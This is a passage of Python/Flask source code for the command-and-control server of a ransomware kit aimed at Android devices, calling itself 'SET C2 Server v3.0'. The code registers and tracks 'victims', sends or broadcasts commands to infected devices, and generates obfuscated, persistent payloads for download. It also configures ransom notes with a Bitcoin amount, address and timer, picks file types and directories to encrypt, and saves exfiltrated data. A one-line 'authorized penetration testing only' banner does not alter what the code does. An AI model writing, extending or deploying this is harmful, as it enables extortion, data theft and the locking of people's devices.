  document.getElementById('victimModal').classList.remove('active');
  currentVictimId = null;
}

function loadVictimEvents(id) {
  fetch('/api/victim/'+id+'/events')
    .then(r => r.json())
    .then(events => {
      const log = document.getElementById('victimEventLog');
      log.innerHTML = events.map(e =>
        '<div class="log-entry '+(e.event_type==='error'?'error':'info')+'">['+new Date(e.timestamp).toLocaleString()+'] '+e.event_type+': '+e.details+'</div>'
      ).join('') || '<div class="text-dim">No events</div>';
    });
}

function sendCommandToVictim() {
  if (!currentVictimId) return;
  const cmd = document.getElementById('modalCmd').value;
  fetch('/api/command', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({victim_id: currentVictimId, command: cmd})
  }).then(r => r.json()).then(res => {
    addLogEntry('Command '+cmd+' sent to '+currentVictimId.slice(0,8), 'system');
  });
}

function broadcastCommand() {
  const victimId = document.getElementById('broadcastVictim').value;
  const cmd = document.getElementById('broadcastCmd').value;
  fetch('/api/command', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({victim_id: victimId, command: cmd})
  }).then(r => r.json()).then(res => {
    addLogEntry('Broadcast command '+cmd+' sent', 'system');
  });
}

function buildPayload() {
  const data = {
    host: document.getElementById('builderHost').value,
    port: parseInt(document.getElementById('builderPort').value),
    ssl: document.getElementById('builderSSL').value === 'true',
    lock_mode: document.getElementById('builderLockMode').value,
    persistence: document.getElementById('builderPersist').value,
    obfuscation: document.getElementById('builderObfuscation').value,
    carrier: document.getElementById('builderCarrier').value,
    name: document.getElementById('builderName').value
  };
  fetch('/api/build', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(data)
  }).then(r => r.json()).then(res => {
    if (res.error) { alert(res.error); return; }
    document.getElementById('builderResult').classList.remove('hidden');
    document.getElementById('builderDownloadLink').href = res.download_url;
    document.getElementById('builderPayloadCode').textContent = res.payload_code || 'Payload generated.';
  });
}

function saveRansomConfig() {
  const data = {
    title: document.getElementById('cfgTitle').value,
    message: document.getElementById('cfgMessage').value,
    amount_btc: parseFloat(document.getElementById('cfgBtcAmount').value),
    btc_address: document.getElementById('cfgBtcAddr').value,
    email: document.getElementById('cfgEmail').value,
    timer_hours: parseInt(document.getElementById('cfgTimer').value)
  };
  fetch('/api/config/ransom_note_template', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(data)
  }).then(r => r.json()).then(res => {
    if (res.success) addLogEntry('Ransom config saved', 'system');
  });
}

function saveTargetConfig() {
  const data = {
    encrypt_extensions: JSON.parse(document.getElementById('cfgExtensions').value),
    target_dirs: JSON.parse(document.getElementById('cfgDirs').value),
    default_lock_mode: document.getElementById('cfgLockMode').value
  };
  fetch('/api/config/target', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(data)
  }).then(r => r.json()).then(res => {
    if (res.success) addLogEntry('Target config saved', 'system');
  });
}

function loadConfig() {
  fetch('/api/config').then(r=>r.json()).then(cfg => {
    if (cfg.ransom_note) {
      document.getElementById('cfgTitle').value = cfg.ransom_note.title || '';
      document.getElementById('cfgMessage').value = cfg.ransom_note.message || '';
      document.getElementById('cfgBtcAmount').value = cfg.ransom_note.amount_btc || 0.5;
      document.getElementById('cfgBtcAddr').value = cfg.ransom_note.btc_address || '';
      document.getElementById('cfgEmail').value = cfg.ransom_note.email || '';
      document.getElementById('cfgTimer').value = cfg.ransom_note.timer_hours || 72;
    }
    if (cfg.target) {
      document.getElementById('cfgExtensions').value = JSON.stringify(cfg.target.encrypt_extensions || [], null, 2);
      document.getElementById('cfgDirs').value = JSON.stringify(cfg.target.target_dirs || [], null, 2);
      document.getElementById('cfgLockMode').value = cfg.target.default_lock_mode || 'files';
    }
  });
}

// Init
console.log('SET C2 Dashboard loaded');
</script>
</body>
</html>
"""

# ============================================================
# FLASK ROUTES
# ============================================================

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/api/victims")
def api_victims():
    return jsonify(get_all_victims())

@app.route("/api/victim/<victim_id>/events")
def api_victim_events(victim_id):
    events = get_victim_events(victim_id)
    return jsonify(events)

@app.route("/api/command", methods=["POST"])
def api_command():
    data = request.json
    victim_id = data.get("victim_id")
    command = data.get("command")
    params = data.get("params", {})

    if victim_id == "__ALL__":
        # Broadcast to all active victims
        cmd_ids = []
        for sid, vinfo in list(connected_victims.items()):
            vid = vinfo.get("victim_id")
            if vid:
                cmd_id = issue_command(vid, command, params)
                cmd_ids.append(cmd_id)
                socketio.emit("command", {
                    "id": cmd_id,
                    "command": command,
                    "params": params
                }, room=sid)
        return jsonify({"success": True, "command_ids": cmd_ids})
    else:
        # Find the victim's socket
        target_sid = None
        for sid, vinfo in list(connected_victims.items()):
            if vinfo.get("victim_id") == victim_id:
                target_sid = sid
                break
        if not target_sid:
            # Still issue command, it will be picked up on next poll
            cmd_id = issue_command(victim_id, command, params)
            return jsonify({"success": True, "command_id": cmd_id, "note": "Victim offline, command queued"})
        cmd_id = issue_command(victim_id, command, params)
        socketio.emit("command", {
            "id": cmd_id,
            "command": command,
            "params": params
        }, room=target_sid)
        return jsonify({"success": True, "command_id": cmd_id})

@app.route("/api/build", methods=["POST"])
def api_build():
    data = request.json
    host = data.get("host", "localhost")
    port = int(data.get("port", 8443))
    use_ssl = data.get("ssl", True)
    lock_mode = data.get("lock_mode", "files")
    persistence = data.get("persistence", "service")
    obfuscation = data.get("obfuscation", "aes")
    carrier = data.get("carrier", "apk")
    name = data.get("name", "payload.apk")

    # Generate the payload code
    from set_payload import generate_payload
    payload_code = generate_payload(
        c2_host=host,
        c2_port=port,
        use_ssl=use_ssl,
        lock_mode=lock_mode,
        persistence=persistence,
        obfuscation=obfuscation
    )

    # Save payload to file for download
    payload_dir = Path(__file__).parent / "generated_payloads"
    payload_dir.mkdir(exist_ok=True)
    payload_path = payload_dir / f"payload_{int(time.time())}.py"
    payload_path.write_text(payload_code)

    return jsonify({
        "success": True,
        "download_url": f"/download/{payload_path.name}",
        "payload_code": payload_code,
        "file": name
    })

@app.route("/download/<filename>")
def download_payload(filename):
    payload_dir = Path(__file__).parent / "generated_payloads"
    filepath = payload_dir / filename
    if not filepath.exists():
        abort(404)
    return send_file(str(filepath), as_attachment=True, download_name=filename)

@app.route("/api/config")
def api_get_config():
    ransom_raw = get_config("ransom_note_template", "{}")
    try:
        ransom_note = json.loads(ransom_raw)
    except:
        ransom_note = {}
    exts_raw = get_config("encrypt_extensions", "[]")
    dirs_raw = get_config("target_dirs", "[]")
    try:
        ext_list = json.loads(exts_raw)
    except:
        ext_list = []
    try:
        dir_list = json.loads(dirs_raw)
    except:
        dir_list = []
    return jsonify({
        "ransom_note": ransom_note,
        "target": {
            "encrypt_extensions": ext_list,
            "target_dirs": dir_list,
            "default_lock_mode": get_config("default_lock_mode", "files")
        }
    })

@app.route("/api/config/ransom_note_template", methods=["POST"])
def api_set_ransom_config():
    data = request.json
    set_config("ransom_note_template", json.dumps(data))
    return jsonify({"success": True})

@app.route("/api/config/target", methods=["POST"])
def api_set_target_config():
    data = request.json
    set_config("encrypt_extensions", json.dumps(data.get("encrypt_extensions", [])))
    set_config("target_dirs", json.dumps(data.get("target_dirs", [])))
    set_config("default_lock_mode", data.get("default_lock_mode", "files"))
    return jsonify({"success": True})

# ============================================================
# SOCKET.IO EVENTS
# ============================================================

@socketio.on("connect")
def handle_connect():
    log.info(f"New connection: {request.sid} from {request.remote_addr}")

@socketio.on("register_victim")
def handle_register(data):
    """Victim registers with the C2."""
    victim_id = data.get("victim_id")
    if not victim_id:
        return

    device_info = {
        "victim_id": victim_id,
        "device_name": data.get("device_name", "Unknown"),
        "android_version": data.get("android_version", "Unknown"),
        "manufacturer": data.get("manufacturer", "Unknown"),
        "model": data.get("model", "Unknown"),
        "sdk_level": data.get("sdk_level", 0),
        "ip": request.remote_addr,
        "first_seen": datetime.utcnow().isoformat(),
        "last_seen": datetime.utcnow().isoformat(),
        "status": "active",
        "lock_mode": data.get("lock_mode", "none"),
    }

    connected_victims[request.sid] = device_info
    join_room(victim_id)

    # Upsert into DB
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    existing = get_victim(victim_id)
    if existing:
        c.execute(
            """UPDATE victims SET device_name=?, android_version=?, manufacturer=?,
               model=?, sdk_level=?, ip=?, last_seen=?, status=?, lock_mode=?
               WHERE id=?""",
            (device_info["device_name"], device_info["android_version"],
             device_info["manufacturer"], device_info["model"],
             device_info["sdk_level"], device_info["ip"],
             device_info["last_seen"], device_info["status"],
             device_info["lock_mode"], victim_id)
        )
    else:
        c.execute(
            """INSERT INTO victims (id, device_name, android_version, manufacturer,
               model, sdk_level, ip, first_seen, last_seen, status, lock_mode)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (victim_id, device_info["device_name"], device_info["android_version"],
             device_info["manufacturer"], device_info["model"],
             device_info["sdk_level"], device_info["ip"],
             device_info["first_seen"], device_info["last_seen"],
             device_info["status"], device_info["lock_mode"])
        )
    conn.commit()
    conn.close()

    add_event(victim_id, "registration", f"Device registered: {device_info['device_name']} ({device_info['manufacturer']} {device_info['model']})")

    # Broadcast to admin sessions
    socketio.emit("victim_update", device_info)

    # Send any pending commands
    pending = get_pending_commands(victim_id)
    for cmd in pending:
        emit("command", {
            "id": cmd["id"],
            "command": cmd["command"],
            "params": json.loads(cmd["params"])
        })

    log.info(f"Victim registered: {victim_id} ({device_info['device_name']})")

@socketio.on("status_update")
def handle_status_update(data):
    """Victim sends status update."""
    victim_id = data.get("victim_id")
    status = data.get("status", "active")
    lock_mode = data.get("lock_mode")
    progress = data.get("progress")
    details = data.get("details", "")

    if victim_id in [v.get("victim_id") for v in connected_victims.values()]:
        # Update in-memory state
        for sid, vinfo in connected_victims.items():
            if vinfo.get("victim_id") == victim_id:
                vinfo["status"] = status
                vinfo["last_seen"] = datetime.utcnow().isoformat()
                if lock_mode:
                    vinfo["lock_mode"] = lock_mode
                break

        # Update DB
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        if lock_mode:
            c.execute("UPDATE victims SET status=?, last_seen=?, lock_mode=? WHERE id=?",
                      (status, datetime.utcnow().isoformat(), lock_mode, victim_id))
        else:
            c.execute("UPDATE victims SET status=?, last_seen=? WHERE id=?",
                      (status, datetime.utcnow().isoformat(), victim_id))
        conn.commit()
        conn.close()

        event_type = "status"
        if status == "locked":
            event_type = "lock"
        elif status == "decrypting":
            event_type = "decrypt"
        elif status == "error":
            event_type = "error"

        add_event(victim_id, event_type, details or f"Status: {status}" + (f" ({progress}%)" if progress else ""))

        # Broadcast to admin
        socketio.emit("victim_update", connected_victims.get(request.sid, {}))
        socketio.emit("victim_event", {
            "victim_id": victim_id,
            "event_type": event_type,
            "details": details or f"Status updated: {status}",
            "timestamp": datetime.utcnow().isoformat()
        })

@socketio.on("command_complete")
def handle_command_complete(data):
    """Victim confirms command execution."""
    cmd_id = data.get("command_id")
    result = data.get("result", "completed")
    victim_id = data.get("victim_id")

    mark_command_executed(cmd_id, result)

    socketio.emit("command_result", {
        "victim_id": victim_id,
        "command_id": cmd_id,
        "result": result
    })

    add_event(victim_id, "command_complete", f"Command {cmd_id[:8]}... completed: {result}")

@socketio.on("exfil_data")
def handle_exfil(data):
    """Victim exfiltrates data to C2."""
    victim_id = data.get("victim_id")
    data_type = data.get("type", "unknown")
    content = data.get("content", "")

    # Save exfiltrated data
    exfil_dir = Path(__file__).parent / "exfiltrated_data" / victim_id
    exfil_dir.mkdir(parents=True, exist_ok=True)
    exfil_file = exfil_dir / f"{data_type}_{int(time.time())}.dat"
    exfil_file.write_text(content)

    add_event(victim_id, "exfiltration", f"Data exfiltrated: {data_type} ({len(content)} bytes)")

    socketio.emit("victim_event", {
        "victim_id": victim_id,
        "event_type": "exfiltration",
        "details": f"Data received: {data_type} ({len(content)} bytes)",
        "timestamp": datetime.utcnow().isoformat()
    })

    log.info(f"Exfil from {victim_id}: {data_type} ({len(content)} bytes)")

@socketio.on("disconnect")
def handle_disconnect():
    vinfo = connected_victims.pop(request.sid, None)
    if vinfo:
        victim_id = vinfo["victim_id"]
        # Mark as offline
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute("UPDATE victims SET status='offline', last_seen=? WHERE id=?",
                  (datetime.utcnow().isoformat(), victim_id))
        conn.commit()
        conn.close()
        add_event(victim_id, "disconnect", "Device went offline")
        vinfo["status"] = "offline"
        socketio.emit("victim_update", vinfo)
        log.info(f"Victim disconnected: {victim_id}")

# ============================================================
# MAIN ENTRY
# ============================================================

def main():
    port = int(get_config("c2_port", "8443"))
    use_ssl = get_config("use_ssl", "true").lower() == "true"

    cert_path = Path(__file__).parent / "set_c2.crt"
    key_path = Path(__file__).parent / "set_c2.key"

    if use_ssl and not cert_path.exists():
        print("[*] Generating self-signed SSL certificate...")
        generate_self_signed_cert(cert_path, key_path)
        print("[*] Certificate generated.")

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║                     SET C2 SERVER v3.0                      ║
║           Sophisticated Encryption Toolkit                  ║
║                                                              ║
║  [+] Dashboard: http{'s' if use_ssl else ''}://0.0.0.0:{port}             ║
║  [+] WebSocket: ws{'s' if use_ssl else ''}://0.0.0.0:{port}                 ║
║  [+] DB: {DB_PATH.name}                                       ║
║  [+] Log: {LOG_FILE.name}                                      ║
║                                                              ║
║  WARNING: Authorized penetration testing only.              ║
╚══════════════════════════════════════════════════════════════╝
    """)

    if use_ssl:
        socketio.run(
            app,
            host="0.0.0.0",
            port=port,
            ssl_context=(str(cert_path), str(key_path)),
            debug=False,
            log_output=False
        )
    else:
        socketio.run(
            app,
            host="0.0.0.0",
            port=port,
            debug=False,
            log_output=False
        )

if __name__ == "__main__":
    main()
